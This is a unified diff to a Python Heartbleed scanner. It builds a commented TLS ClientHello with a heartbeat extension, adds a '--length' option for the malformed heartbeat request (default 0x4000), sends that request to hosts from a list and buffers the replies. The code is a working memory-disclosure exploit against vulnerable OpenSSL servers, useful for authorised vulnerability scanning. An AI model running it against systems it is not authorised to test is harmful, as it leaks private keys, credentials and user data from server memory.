@@ -14,6 +14,7 @@ import socket
 import time
 import select
 import re
+import random
 from collections import defaultdict
 from argparse import ArgumentParser
 
@@ -47,10 +48,10 @@ parser.add_argument(      "--no-summary", dest="summary",   default=True,       
 parser.add_argument("-t", "--timestamp",  dest="timestamp", const="%Y-%m-%dT%H:%M:%S%z:", nargs="?",            help="add timestamps to output; optionally takes format string (default: '%%Y-%%m-%%dT%%H:%%M:%%S%%z:')")
 parser.add_argument(      "--starttls",   dest="starttls",  const="25/smtp, 110/pop3, 143/imap, 389/ldap, 5222/xmpp, 5269/xmpp", default ="", nargs="?", help="insert proper protocol stanzas to initiate STARTTLS (default: '25/smtp, 110/pop3, 143/imap, 389/ldap, 5222/xmpp, 5269/xmpp')")
 parser.add_argument("-p", "--ports",      dest="ports",     action="append",              nargs=1,              help="list of ports to be scanned (default: 443)")
+parser.add_argument("-l", "--length",     dest="length",    default=0x4000,               type=int,             help="heartbeat request length field")
 parser.add_argument("-H", "--hosts",      dest="hosts",     default=False,                action="store_true",  help="turn off hostlist processing, process host names directly instead")
 parser.add_argument("hostlist",                             default=["-"],                nargs="*",            help="list(s) of hosts to be scanned (default: stdin)")
 args = parser.parse_args()
-
 
 # Parse port list specification
 portlist = []
@@ -101,35 +102,143 @@ def get_ipv6_address(host):
 
 
 def h2bin(x):
+    x = re.sub(r'#.*$', r'', x, flags=re.MULTILINE)
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
-hello = h2bin('''
-16 03 02 00  dc 01 00 00 d8 03 02 53
-43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
-bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
-00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
-00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
-c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
-c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
-c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
-c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
-00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
-03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
-00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
-00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
-00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01
-''')
+hello_pre = h2bin('''
+        16          # type
+        03 02       # version
+        00 dc       # len
+        01          # type
+        00 00 d8    # len
+        03 02       # version
+        ''')
 
-hb = h2bin(''' 
-18 03 02 00 03
-01 40 00
-''')
+hello_post = h2bin('''
+        # session id
+        00          # len
+
+        # cipher suites
+        00 66       # len   102 = 51 suites
+        c0 14
+        c0 0a
+        c0 22
+        c0 21
+        00 39
+        00 38
+        00 88
+        00 87
+        c0 0f
+        c0 05
+        00 35
+        00 84
+        c0 12
+        c0 08
+        c0 1c
+        c0 1b
+        00 16
+        00 13
+        c0 0d
+        c0 03
+        00 0a
+        c0 13
+        c0 09
+        c0 1f
+        c0 1e
+        00 33
+        00 32
+        00 9a
+        00 99
+        00 45
+        00 44
+        c0 0e
+        c0 04
+        00 2f
+        00 96
+        00 41
+        c0 11
+        c0 07
+        c0 0c
+        c0 02
+        00 05
+        00 04
+        00 15
+        00 12
+        00 09
+        00 14
+        00 11
+        00 08
+        00 06
+        00 03
+        00 ff
+
+        # compressors
+        01          # len
+        00
+
+        # extensions
+        00 49       # len
+
+        # ext: ec point formats
+        00 0b       # type
+        00 04       # len
+        03          # len
+        00
+        01
+        02
+
+        # ext: elliptic curves
+        00 0a       # type
+        00 34       # len
+        00 32       # len
+        00 0e
+        00 0d
+        00 19
+        00 0b
+        00 0c
+        00 18
+        00 09
+        00 0a
+        00 16
+        00 17
+        00 08
+        00 06
+        00 07
+        00 14
+        00 15
+        00 04
+        00 05
+        00 12
+        00 13
+        00 01
+        00 02
+        00 03
+        00 0f
+        00 10
+        00 11
+
+        # ext: session ticket
+        00 23       # type
+        00 00       # len
+
+        # ext: heartbeat
+        00 0f       # type
+        00 01       # len
+        01          # peer_allowed_to_send
+        ''')
+
+def create_clienthello():
+    return  hello_pre + \
+            struct.pack('>L', time.time()) + \
+            struct.pack('>7L',              random.getrandbits(32),
+                    random.getrandbits(32), random.getrandbits(32),
+                    random.getrandbits(32), random.getrandbits(32),
+                    random.getrandbits(32), random.getrandbits(32)) + \
+            hello_post
 
 def create_hb_req(version, length):
     return h2bin('18') + struct.pack('>H', version) + \
         h2bin('00 03 01') + struct.pack('>H', length)
-
 
 def hexdump(s):
     for b in xrange(0, len(s), 16):
@@ -139,43 +248,40 @@ def hexdump(s):
         #print '  %04x: %-48s %s' % (b, hxdat, pdat)
     #print
 
+recv_buffer = ''
+
 def recvall(s, length, timeout=5):
+    global recv_buffer
     endtime = time.time() + timeout
     rdata = ''
     remain = length
     while remain > 0:
-        rtime = endtime - time.time() 
+        if len(recv_buffer)>0:
+            d = recv_buffer[:remain]
+            remain -= len(d)
+            rdata += d
+            recv_buffer = recv_buffer[len(d):]
+        if remain==0:
+            return rdata
+        rtime = endtime - time.time()
         if rtime < 0:
-            return None
-        r, w, e = select.select([s], [], [], 5)
-        if s in r:
-            try:
-                data = s.recv(remain)
-            except Exception, e:
+            if len(rdata)>0:
+                return rdata
+            else:
                 return None
+        r, w, e = select.select([s], [], [], 1)
+        if s in r:
+            data = s.recv(remain)
             # EOF?
             if not data:
-                return None
-            rdata += data
-            remain -= len(data)
+                if len(rdata)>0:
+                    return rdata
+                else:
+                    return None
+            recv_buffer += data
     return rdata
-        
 
-def recvmsg(s):
-    hdr = recvall(s, 5)
-    if hdr is None:
-        #print 'Unexpected EOF receiving record header - server closed connection'
-        return None, None, None
-    typ, ver, ln = struct.unpack('>BHH', hdr)
-    pay = recvall(s, ln, 10)
-    if pay is None:
-        #print 'Unexpected EOF receiving record payload - server closed connection'
-        return None, None, None
-    #print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
-    return typ, ver, pay
-
-
-def hit_hb(s):
+def hit_hb(s, hb):
     s.send(hb)
     while True:
         typ, ver, pay, done = recv_sslrecord(s)
@@ -281,7 +387,7 @@ def is_vulnerable(domain, port, protocol):
     #sys.stdout.flush()
     if starttls_modes[port]:
         do_starttls(s, starttls_modes[port])
-    s.send(hello)
+    s.send(create_clienthello())
     #print 'Waiting for Server Hello...'
     #sys.stdout.flush()
     version = None
@@ -290,14 +396,14 @@ def is_vulnerable(domain, port, protocol):
         if typ == None:
             #print 'Server closed connection without sending Server Hello.'
             return None
+        version = ver
         # Look for server hello done message.
         if typ == 22 and done:
             break
 
     #print 'Sending heartbeat request...'
     #sys.stdout.flush()
-    s.send(hb)
-    return hit_hb(s)
+    return hit_hb(s, create_hb_req(version, args.length))
 
 
 def scan_address(domain, address, protocol, portlist):
